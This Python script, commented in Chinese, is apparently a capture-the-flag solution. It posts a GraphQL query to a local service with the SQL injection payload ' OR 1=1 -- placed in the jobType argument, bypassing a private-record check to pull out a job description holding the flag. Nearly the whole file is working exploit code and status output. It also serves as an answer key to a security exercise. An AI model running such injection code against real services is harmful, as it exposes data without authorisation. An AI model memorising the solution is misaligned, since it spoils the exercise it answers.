import requests
import json


def exploit_sql_injection():
    """
    利用 SQL 注入获取包含 flag 的 private 职位信息
    """
    url = "http://localhost:8000/graphql/"

    # SQL 注入 payload: ' OR 1=1 --
    # 这将使 SQL 查询变为: SELECT * FROM jobs WHERE type = '' OR 1=1 --'
    # 从而绕过 private 检查并返回所有记录
    payload = "' OR 1=1 --"

    # 构造 GraphQL 查询
    graphql_query = {
        "query": f"""
        query {{
            jobs(jobType: "{payload}") {{
                id
                name
                type
                description
            }}
        }}
        """
    }

    headers = {"Content-Type": "application/json"}

    try:
        print("[*] 发送 SQL 注入请求...")
        print(f"[*] Payload: {payload}")

        response = requests.post(url, headers=headers, json=graphql_query)

        if response.status_code == 200:
            result = response.json()

            if "errors" in result:
                print(f"[!] GraphQL 错误: {result['errors']}")
                return

            jobs = result.get("data", {}).get("jobs", [])
            print(f"[+] 成功获取 {len(jobs)} 个职位信息")

            # 查找包含 flag 的 private 职位
            for job in jobs:
                print(
                    f"[*] 职位: {job['name']} | 类型: {job['type']} | 描述: {job['description']}"
                )

                if job["type"] == "private":
                    print(f"[+] 找到 Flag: {job['description']}")
                    return job["description"]

        else:
            print(f"[!] 请求失败，状态码: {response.status_code}")
            print(f"[!] 响应内容: {response.text}")

    except Exception as e:
        print(f"[!] 请求异常: {str(e)}")


if __name__ == "__main__":
    flag = exploit_sql_injection()

    if flag:
        print(f"\n[+] 成功获取 Flag: {flag}")
    else:
        print("\n[!] 未能获取 Flag")
